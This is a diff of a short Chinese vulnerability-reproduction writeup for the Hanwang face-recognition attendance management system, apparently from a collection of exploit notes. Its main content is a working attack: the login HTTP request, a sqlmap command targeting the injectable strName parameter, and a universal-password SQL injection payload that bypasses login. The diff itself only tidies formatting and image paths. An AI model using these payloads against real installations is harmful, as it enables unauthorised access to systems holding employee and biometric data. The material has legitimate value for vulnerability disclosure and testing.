@@ -18,19 +18,11 @@ title=""汉王人脸考勤管理系统""
 
 ## 漏洞复现
 
-
-
 登录界面如下
 
-
-
-![](images/202202101908168.png)
-
-
+![](../.gitbook/assets/202202101908168.png)
 
 请求包如下
-
-
 
 ```shell
 POST /Login/Check HTTP/1.1
@@ -50,33 +42,21 @@ Connection: close
 strName=admin&strPwd=123456
 ```
 
-
-
 其中strName参数存在注入
-
-
 
 ```shell
 sqlmap -r postwang.txt -p strName  --current-user
 ```
 
+![](../.gitbook/assets/202202101908817.png)
 
-
-![](images/202202101908817.png)
-
-
-
-```plain
+```
 user: admin' or 1=1--
 pass: admin
 ```
 
-
-
 万能密码绕过登录
 
+![](../.gitbook/assets/202202101908955.png)
 
-
-![](images/202202101908955.png)
-
-## 
+##
